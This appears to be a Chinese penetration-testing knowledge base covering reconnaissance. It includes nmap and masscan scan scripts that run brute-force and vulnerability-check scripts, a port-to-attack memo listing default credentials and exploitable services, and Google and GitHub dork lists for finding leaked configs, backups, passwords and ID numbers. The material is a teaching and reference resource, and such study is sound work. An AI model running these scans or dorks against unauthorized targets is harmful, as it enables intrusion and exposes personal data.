masscan_to_nmap Goby shuize fscan ALLin 端口&C段扫描 [!NOTE] 大多数情况下扫描C段就足够了，有需要的也可以扫描B段，或者相邻的C段 手动扫描的结果是实时的，比空间搜索引擎会准确得多 这里主要介绍一些常用的扫描端口以及C段的工具 Nmap https://nmap.org/ 王牌扫描器怎么能不放第一个呢？ nmap的使用方法就不用多说了，列举一下通过不同协议不同的方式进行扫描的命令吧，是一款一直都在用的工具，缺点就是扫描速度较慢 nmap -sP 127.0.0.1 nmap -sT 127.0.0.1 nmap -sS 127.0.0.1 nmap -sU 127.0.0.1 nmap -sF 127.0.0.1 nmap -sX 127.0.0.1 nmap -sN 127.0.0.1 写一个我常用的命令吧，有需要其他参数可以按需添加 nmap -vvv -Pn -p- ip/24 -n -T4 再放两个写的快速启动的sh脚本 扫描全端口，并调用各种脚本 #!/usr/bin/env bash read -p \"ip: \" ip nmap -v -Pn -p- --open -sV $ip -n -T4 --max-scan-delay 10 --max-retries 3 --min-hostgroup 10 -oX $ip-result-`date +%y-%m-%d-%H-%M-%S`.xml --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 快速扫描常见端口，并调用各种脚本 #!/usr/bin/env bash read -p \"ip: \" ip nmap -vvv -Pn -p 20,22,23,25,53,69,80-89,443,8440-8450,8080-8089,110,111,137,143,161,389,512,873,1194,1352,1433,1521,1500,1723,2082,2181,2601,3128,3312,3306,3389,3690,4848,5000,5432,5900,5984,6379,7001,7002,7003,7778,8000,8069,8888,9000,9002,9080-9081,9090,9200,10001,10002,11211,27017,50070 --open -sV $ip -n -T4 --max-scan-delay 10 --max-retries 3 --min-hostgroup 10 -oX $ip-result-`date +%y-%m-%d-%H-%M-%S`.xml --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute msscan https://github.com/robertdavidgraham/masscan 扫描速度很快，但是精准度不够，速率高了漏报可能比较多 masscan -p80,8000-8100 10.0.0.0/8 --rate=10000 masscan_to_nmap masscan扫描速度快，nmap扫描慢但是准确度高，那么是不是可以给他俩缝合起来呢？ 当然是可以的，可以选择自己造轮子也可以选择网上别写造好的 推荐一个：https://github.com/7dog7/masscan_to_nmap Goby https://cn.gobies.org/ Goby的优势是方便直观，支持图形化，且支持POC进行漏洞扫描，可自定义POC shuize https://github.com/0x727/ShuiZe_0x727 水泽自带资产探活、支持漏洞验证、Host碰撞 python3 ShuiZe.py -c 192.168.1.0,192.168.2.0,192.168.3.0 fscan https://github.com/shadow1ng/fscan 扫描速度快，支持漏洞验证 fscan.exe -h ip/24 fscan.exe -h 192.168.1.1 -p 1-65535 ALLin https://github.com/P1-Team/AlliN 一款红队信息搜集工具，被动识别访问站点是否是云上站点 python3 AlliN.py --host 10.1.1.1/24 -p 80 -m pscan Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 09:23:02 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/05.组合工具.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/05.组合工具.html","title":"05.组合工具","keywords":"","body":" 组合工具 Ehole AlliN 组合工具 如果能快速的获取C段情况，然后验证目标网站的存活性，获取title、架构、组件、框架、使用产品等信息，可以帮我们节省大量时间 当然也有人已经写好了，自己比较闲或者想锻炼的话，也可以自己开发。 Ehole https://github.com/EdgeSecurityTeam/EHole EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic...)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。 AlliN https://github.com/P1-Team/AlliN 一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具，由之前写的工具AG3改名而来。是一款轻便、小巧、快速、全面的扫描工具。多用于渗透前资产收集和渗透后内网横向渗透。工具从项目上迭代了一些懒人功能（比如提供扫描资产文件中，可以写绝大部分的各种形式的链接/CIDR,并在此基础上可以添加任意端口和路径） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 17:51:12 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/06.浏览器插件.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/06.浏览器插件.html","title":"06.浏览器插件","keywords":"","body":" 浏览器插件 shodan.io Fofa Pro View 浏览器插件 浏览器插件大多是基于服务本身缓存的数据，类似网络空间搜索引擎这种，直接从数据库获取数据，所以结果也具有一定的实效性 shodan.io https://addons.mozilla.org/zh-CN/firefox/addon/shodan_io/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search Fofa Pro View https://addons.mozilla.org/zh-CN/firefox/addon/fofa-pro-view/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 09:30:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/07.端口对应渗透（端口渗透备忘录）.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/07.端口对应渗透（端口渗透备忘录）.html","title":"07.端口对应渗透（端口渗透备忘录）","keywords":"","body":" [!NOTE|style:flat] 结合了几个地方的端口备忘录，不过还是觉得凭经验最重要，这些都只是辅助 端口 服务 渗透用途 tcp 20,21 FTP 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4) tcp 22 SSH 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等 tcp 23 Telnet 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令 tcp 25 SMTP 邮件伪造,vrfy/expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑 tcp/udp 53 DNS 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控 tcp/udp 69 TFTP 尝试下载目标及其的各类重要配置文件 tcp 80-89,443,8440-8450,8080-8089 各种常用的Web服务端口 可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等…… tcp 110 POP3 可尝试爆破,嗅探 tcp 111,2049 NFS 权限配置不当 tcp 137,139,445 Samba 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等…… tcp 143 IMAP 可尝试爆破 udp 161 SNMP 爆破默认团队字符串,搜集目标内网信息 tcp 389 LDAP ldap注入,允许匿名访问,弱口令 tcp 512,513,514 Linux rexec 可爆破,rlogin登陆 tcp 873 Rsync 匿名访问,文件上传 tcp 1194 OpenVPN 想办法钓VPN账号,进内网 tcp 1352 Lotus 弱口令,信息泄漏,爆破 tcp 1433 SQL Server 注入,提权,sa弱口令,爆破 tcp 1521 Oracle tns爆破,注入,弹shell… tcp 1500 ISPmanager 弱口令 tcp 1723 PPTP 爆破,想办法钓VPN账号,进内网 tcp 2082,2083 cPanel 弱口令 tcp 2181 ZooKeeper 未授权访问 tcp 2601,2604 Zebra 默认密码zerbra tcp 3128 Squid 弱口令 tcp 3312,3311 kangle 弱口令 tcp 3306 MySQL 注入,提权,爆破 tcp 3389 Windows rdp shift后门[需要03以下的系统],爆破,ms12-020 tcp 3690 SVN svn泄露,未授权访问 tcp 4848 GlassFish 弱口令 tcp 5000 Sybase/DB2 爆破,注入 tcp 5432 PostgreSQL 爆破,注入,弱口令 tcp 5900,5901,5902 VNC 弱口令爆破 tcp 5984 CouchDB 未授权导致的任意指令执行 tcp 6379 Redis 可尝试未授权访问,弱口令爆破 tcp 7001,7002 WebLogic Java反序列化,弱口令 tcp 7778 Kloxo 主机面板登录 tcp 8000 Ajenti 弱口令 tcp 8443 Plesk 弱口令 tcp 8069 Zabbix 远程执行,SQL注入 tcp 8080-8089 Jenkins,JBoss 反序列化,控制台弱口令 tcp 9080-9081,9090 WebSphere Java反序列化/弱口令 tcp 9200,9300 ElasticSearch 远程执行 tcp 11211 Memcached 未授权访问 tcp 27017,27018 MongoDB 爆破,未授权访问 tcp 50070,50030 Hadoop 默认端口未授权访问 端口号 端口说明 渗透思路 21/69 FTP/TFTP：文件传输协议 爆破、内网嗅探 22 SSH：远程连接 用户名枚举、爆破 23 Telnet：远程连接 爆破、内网嗅探 25 SMTP：邮件服务 邮件伪造 53 DNS：域名系统 DNS域传送\\DNS缓存投毒\\DNS欺骗\\利用DNS隧道技术刺透防火墙 389 LDAP 未授权访问（通过LdapBrowser工具直接连入） 443 https服务 OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标） 445 SMB服务 ms17_010远程代码执行 873 rsync服务 未授权访问 1090/1099 Java-rmi JAVA反序列化远程命令执行漏洞 1352 Lotus Domino邮件服务 爆破：弱口令、信息泄漏：源代码 1433 MSSQL 注入、SA弱口令爆破、提权 1521 Oracle 注入、TNS爆破 2049 NFS 配置不当 2181 ZooKeeper服务 未授权访问 3306 MySQL 注入、爆破、写shell、提权 3389 RDP 爆破、Shift后门、CVE-2019-0708远程代码执行 4848 GlassFish控制台 爆破：控制台弱口令、认证绕过 5000 Sybase/DB2数据库 爆破、注入 5432 PostgreSQL 爆破弱口令、高权限执行系统命令 5632 PcAnywhere服务 爆破弱口令 5900 VNC 爆破：弱口令、认证绕过 6379 Redis 未授权访问、爆破弱口令 7001 WebLogic中间件 反序列化、控制台弱口令+部署war包、SSRF 8000 jdwp JDWP 远程命令执行漏洞（工具） 8080/8089 Tomcat/JBoss/Resin/Jetty/Jenkins 反序列化、控制台弱口令、未授权 8161 ActiveMQ admin/admin、任意文件写入、反序列化 8069 Zabbix 远程命令执行 9043 WebSphere控制台 控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行 9200/9300 Elasticsearch服务 远程代码执行 11211 Memcache 未授权访问（nc -vv 目标 11211） 27017 MongoDB 未授权访问、爆破弱口令 50000 SAP 远程代码执行 50070 hadoop 未授权访问 端口号 服务 渗透思路 21 FTP/TFTP/VSFTPD 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/openssh漏洞 23 Telnet远程连接 爆破/嗅探/弱口令 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 域传送/劫持/缓存投毒/欺骗 67/68 dhcp服务 劫持/欺骗 110 pop3 爆破/嗅探 139 Samba服务 爆破/未授权访问/远程命令执行 143 Imap协议 爆破161SNMP协议爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/未授权访问 1080 socket 爆破 1352 Lotus domino邮件服务 爆破/信息泄漏 1433 mssql 爆破/注入/SA弱口令 1521 oracle 爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 3306 mysql 爆破/注入 3389 Rdp远程桌面链接 爆破/shift后门 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入/提权 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 抓密码/代码执行 5900 vnc 爆破/认证绕过 6379 Redis数据库 未授权访问/爆破 7001/7002 weblogic java反序列化/控制台弱口令 80/443 http/https web应用漏洞/心脏滴血 8069 zabbix服务 远程命令执行/注入 8161 activemq 弱口令/写文件 8080/8089 Jboss/Tomcat/Resin 爆破/PUT文件上传/反序列化 8083/8086 influxDB 未授权访问 9000 fastcgi 远程命令执行 9090 Websphere 控制台爆破/java反序列化/弱口令 9200/9300 elasticsearch 远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 端口号 服务 渗透思路 20 ftp_data 爆破、嗅探、溢出、后门 21 ftp_control 爆破、嗅探、溢出、后门 23 telnet 爆破、嗅探 25 smtp 邮件伪造 53 DNS DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用：利用DNS隧道技术刺透防火墙 67 dhcp 劫持、欺骗 68 dhcp 劫持、欺骗 110 pop3 爆破 139 samba 爆破、未授权访问、远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击、未授权访问 512 linux r 直接使用rlogin 513 linux r 直接使用rlogin 514 linux r 直接使用rlogin 873 rsync 未授权访问 888 BTLINUX 宝塔Linux主机管理后台/默认帐户：admin｜默认密码：admin 999 PMA 护卫神佩带的phpmyadmin管理后台，默认帐户：root｜默认密码：huweishen.com 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令、信息泄露：源代码 1433 mssql 爆破：使用系统用户登录、注入攻击 1521 oracle 爆破：TNS、注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破、拒绝服务、注入 3389 rdp 爆破、Shift后门 4848 glassfish 爆破：控制台弱口令、认证绕过 5000 sybase/DB2 爆破、注入 5432 postgresql 缓冲区溢出、注入攻击、爆破：弱口令 5632 pcanywhere 拒绝服务、代码执行 5900 vnc 爆破：弱口令、认证绕过 5901 vnc 爆破：弱口令、认证绕过 5902 vnc 爆破：弱口令、认证绕过 6379 redis 未授权访问、爆破：弱口令 7001 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 7002 weblogic JAVA反序列化、控制台弱口令、控制台部署webshell 80 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 443 web 常见Web攻击、控制台爆破、对应服务器版本漏洞 8080 web｜Tomcat｜.. 常见Web攻击、控制台爆破、对应服务器版本漏洞、Tomcat漏洞 8069 zabbix 远程命令执行 9090 websphere 文件泄露、爆破：控制台弱口令、Java反序列 9200 elasticsearch 未授权访问、远程代码执行 9300 elasticsearch 未授权访问、远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破、未授权访问 27018 mongodb 爆破、未授权访问 50070 Hadoop 爆破、未授权访问 50075 Hadoop 爆破、未授权访问 14000 Hadoop 爆破、未授权访问 8480 Hadoop 爆破、未授权访问 8088 web 爆破、未授权访问 50030 Hadoop 爆破、未授权访问 50060 Hadoop 爆破、未授权访问 60010 Hadoop 爆破、未授权访问 60030 Hadoop 爆破、未授权访问 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 10003 Hadoop 爆破、未授权访问 5984 couchdb 未授权访问 445 SMB 弱口令爆破，检测是否有ms_08067等溢出 1025 111 NFS 2082 cpanel主机管理系统登陆 （国外用较多） 2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601 zebra路由 2604 zebra路由 3128 代理默认端口,如果没设置口令很可能就直接漫游内网了 3311 kangle主机管理系统登陆 3312 kangle主机管理系统登陆 4440 参考WooYun: 借用新浪某服务成功漫游新浪内网 6082 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7778 主机控制面板登录 8083 主机管理系统 （国外用较多） 8649 8888 主机管理系统默认端口 9000 fcgi php执行 50000 SAP 命令执行 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 15:07:58 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/","title":"04.其他应用收集","keywords":"","body":"其他应用收集 在web资产有限的情况下，可以通过公众号、小程序和APP等常见的应用来进行渗透，获取冷门资产进行漏洞挖掘，扩大攻击范围 [!TIP|style:flat] 搜索的时候也可以采用关键词去搜索，往往可以发现更多东西 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序.html","title":"01.小程序","keywords":"","body":" 小程序 企查查 微信APP 支付宝APP 小程序 企查查 找到小程序点击即可 微信APP 支付宝APP 和微信类似，但是不同平台因为不同的规则，可能有一点点差异 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/02.公众号.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/02.公众号.html","title":"02.公众号","keywords":"","body":" 公众号 企查查、天眼查 搜狗微信搜索 微信APP 公众号 企查查、天眼查 企查查：https://www.qcc.com/ 天眼查：https://www.tianyancha.com/ 直接搜索相应公司，在菜单栏中找到微信公众号 搜狗微信搜索 https://weixin.sogou.com/ 微信APP Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:41:03 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP.html","title":"03.APP","keywords":"","body":" APP信息收集 七麦数据 豌豆荚 企查查&天眼查 App Store APP信息收集 收集到APP，可以测正常功能，也可以对它进行反编译查看源码，可能获取一些敏感的接口等信息，具体的后面再体现。 七麦数据 https://www.qimai.cn/ 直接搜索可以获取到部分相关的APP [!TIP|style:flat] 但是有些较隐藏的APP直接搜名字还是搜不出来，这个时候我们就会用到七麦一个很方便的功能：同开发者APP [!TIP] 此外，还可以获取APP的历史版本，可能里面存在大量的敏感信息!!! 豌豆荚 使用豌豆荚可以方便的获取到APP的历史版本 企查查&天眼查 App Store 搜索到应用往下滑，其实也是和七麦数据找同开发者APP一样的 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/04.PC应用.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/04.PC应用.html","title":"04.PC应用","keywords":"","body":"PC应用 看看客户端的产品，可能有时候也会发现一些突破口 一般比较明显的官网就可以下载，可能还有一些隐藏的PC应用，或者测试版，就需要自己去寻找了 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/","title":"01.CMS识别","keywords":"","body":"识别出目标的指纹信息，可以辅助我们快速的了解目标情况，调整进攻方向。 如：目标使用开源CMS搭建的网站，那我们可以对该开源CMS进行审计，发现一些问题辅助我们进行渗透，还可以混CVE和CNVD Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 09:40:37 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/01.在线平台.html":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/01.在线平台.html","title":"01.在线平台","keywords":"","body":"在线平台 bugscaner: http://whatweb.bugscaner.com/look/ 数字观星: https://fp.shuziguanxing.com/#/ 云悉: https://www.yunsee.cn/ （需要注册，以前还好，感觉现在不靠谱，说的提交指纹一周左右给回复，等了一周多都没反应） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 10:21:52 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/02.工具.html":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/02.工具.html","title":"02.工具","keywords":"","body":"工具 其实和在线平台类似，区别就在于使用工具是自己发起请求去判断，而使用在线平台就是它发起请求。 判断无非是基于图标、特殊内容、特殊内容的md5值来判断等等 常用指纹识别工具有： 御剑Web指纹识别 WhatWeb Test404轻量CMS指纹识别+v2.1 椰树 ... 一些Github项目 CMSeeK CMSmap ACMSDiscovery TideFinger AngelSword [!TIP] 有能力可以自己开发，去其糟粕，取其精华，主要是指纹库的维护和更新 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 10:26:36 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/03.浏览器插件.html":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/01.CMS识别/03.浏览器插件.html","title":"03.浏览器插件","keywords":"","body":"浏览器插件是真的方便 wappalyzer https://www.wappalyzer.com/ 好用，真的好用，强烈推荐，直接去插件商店下载就可以了 而且还开源了指纹库：https://github.com/AliasIO/wappalyzer/tree/master/src/technologies Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 10:54:31 "},"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/02.WAF识别/":{"url":"个人知识库/01.渗透测试/01.信息收集/2.指纹识别/02.WAF识别/","title":"02.WAF识别","keywords":"","body":" WAF识别 手动 工具wafw00f WAF识别 主要有两种手法吧，一种是手动，一种是工具 知道了是否有WAF，用的什么WAF，我们才好对症下药 手动 一般来说WAF都会拦截敏感文件下载，如a.sql、a.mdb等，直接添加到网站URL中即可 [!NOTE] 一些WAF可能不防护这些，那么就可以拿一些XSS、SQLI的payload来测试也可 工具wafw00f https://github.com/EnableSecurity/wafw00f [!NOTE] 工具其实就是为了重复手动的操作，原理都是一样的   wafw00f https://blog.gm7.org/ ______ / \\ ( W00f! ) \\ ____/ ,, __ 404 Hack Not Found |`-.__ / / __ __ /\" _/ /_/ \\ \\ / / *===* / \\ \\_/ / 405 Not Allowed / )__// \\ / /| / /---` 403 Forbidden \\\\/` \\ | / _ \\ `\\ /_\\\\_ 502 Bad Gateway / / \\ \\ 500 Internal Error `_____``-` /_/ \\_\\ ~ WAFW00F : v2.1.0 ~ The Web Application Firewall Fingerprinting Toolkit [*] Checking https://blog.gm7.org/ [+] The site https://blog.gm7.org/ is behind Cloudflare (Cloudflare Inc.) WAF. [~] Number of requests: 2 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 11:38:27 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/01.目录扫描.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/01.目录扫描.html","title":"01.目录扫描","keywords":"","body":" 目录扫描 介绍 工具推荐 目录扫描 介绍 通过目录扫描，我们可能可以发现很多东西，如： 备份文件：www.zip、www.rar、blog.gm7.org.zip等 代码仓库：.git、.svn等（恢复工具github一大堆，关键词githack等，就不单独推荐了，都那样吧） 敏感、隐藏目录：/swagger-ui.html、/env等 ... 渗透前简单的扫个目录，一定是不亏的，说不定就发现了什么秘密呢 [!NOTE|style:flat] 能扫出来什么东西，主要还是取决于自己字典的大小和内容，平时可以多收集整理，以备不时之需 工具推荐 yuhScan: https://github.com/hunyaio/yuhScan 推荐理由：go高并发、支持递归、分组扫描、BUG修复快、熟人可以定制开发 dirmap: https://github.com/H4ckForJob/dirmap 推荐理由：支持递归扫描、功能将会强于DirBuster、Dirsearch、cansina、御剑 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 11:54:13 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/02.Google Hacking.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/02.Google Hacking.html","title":"02.Google Hacking","keywords":"","body":" Google Hacking 介绍 说明 Hacking 管理后台地址 上传类漏洞地址 注入页面 编辑器页面 目录遍历漏洞 SQL错误 phpinfo 配置文件泄露 数据库文件泄露 日志文件泄露 备份和历史文件泄露 公开文件泄露 邮箱信息 社工信息 Google Hacking 介绍 google作为一款发达的搜索引擎，每天都会爬取各种各样的网站，收录的东西也很多，合理利用Google的搜索语法，可能发现很多敏感的数据信息。 [!TIP|style:flat] 搜索也是一门艺术 比如：filetype:xlsx 身份证 说明 Google检索技巧大全: https://sites.google.com/site/hopeanwang/google%E6%A3%80%E7%B4%A2%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8 运算符 用途 实际用法实例 \"\"(双引号) 搜索词放在双引号中，代表完全匹配搜索 \"keyword\" *（通配符） * 号代表任何文字，比如想查找\"搜索*擎\"，返回的结果就不仅包含\"搜索引擎\"，还包含了\"搜索收擎\"，\"搜索巨擎\"等内容。 \"搜索*擎\" +（与） 搜索所有包含关键词\"keyword1\"和\"keyword2**\"的中文网页 \"keyword1 keyword2\"\"keyword1+keyword2\" -（非） 搜索去除keyword2的keyword1 \"keyword1 -keyword2\" OR(或) 搜索 A 或者 B \"keyword1 OR keyword2\" ~keyword1 搜索它的同义词 ~喜欢 ~keyword1-keyword2 只搜索同义词,不要原词 ~WORD-WORD 关键词 用途 实际用法实例 allinanchor: 限制搜索的词语是网页中链接内包含的关键词（可使用多个关键词） allinanchor: keyword1 keyword2 allintext: 限制搜索的词语是网页内文包含的关键词（可使用多个关键词） allintext: keyword1 keyword2 cache: 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 cache:https://www.baidu.com/ filetype/ext: 限制搜索的词语是网页中链接内包含的关键词 filetype:pdf ios开发 -filetype: -filetype:SOMEFILETYPE = 剔除指定文件类型. -filetype:SOMEFILETYPE intitle: 搜索网页标题中包含有特定字符的网页 intitle: 登陆 inurl: 搜索包含有特定字符的URL inurl: ?id= intext: 限制搜索的词语是网页内文包含的关键词 intext:密码 inanchor:keyword 指令返回的结果是导入链接锚文字中包含搜索词的页面 inanchor:关于我们 site: 搜索指定域名的内容 site:www.github.com keywordkeyword site:www.github.com Hacking 一些常用的语法，帮助我们快速定位一些数据，主要还是依赖于上面部分的扩展，抛砖引玉 Google Hacking Database cxsecurity-hacking-dorks 管理后台地址 site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 site:target.com inurl:file site:target.com inurl:upload 注入页面 site:target.com inurl:?id= site:target.com inurl:php?id= 编辑器页面 site:target.com inurl:ewebeditor 目录遍历漏洞 site:target.com intitle: \"index of\" SQL错误 site:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:\"Warning: pg_connect()\" phpinfo site:target.com ext:php intitle:phpinfo \"published by the PHP Group\" 配置文件泄露 site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 site:target.com ext:.log 备份和历史文件泄露 site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 site:target.com intext:@target.com site:target.com 邮件 site:target.com email 社工信息 site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-05 12:59:19 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/03.GitHub信息收集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/03.GitHub信息收集.html","title":"03.GitHub信息收集","keywords":"","body":" 介绍 一些语法 推荐工具 GitDorker 其他平台 介绍 GitHub敏感信息泄露一直是企业信息泄露和知识产权泄露的重灾区，安全意识薄弱的同事经常会将公司的代码、各种服务的账户等极度敏感的信息『开源』到github中；利用github搜索关键词，或者结合特定语法来使用，效果更佳 [!TIP] 一般搜索以域名、特殊JS路径、备案、网站的技术支持等关键内容为主，不要局限于域名 高级搜索：https://github.com/search/advanced 如搜索包含 aliyuncs 和 password 的代码 aliyuncs password 一些语法 参考自：https://github.com/obheda12/GitDorker/tree/master/Dorks 所有语法txt版 alldorksv3 medium_dorks 自己总结的small版 \"token\" \"password\" \"secret\" \"passwd\" \"username\" \"key\" \"apidocs\" \"appspot\" \"auth\" \"aws_access\" \"config\" \"credentials\" \"dbuser\" \"ftp\" \"login\" \"mailchimp\" \"mailgun\" \"mysql\" \"pass\" \"pem private\" 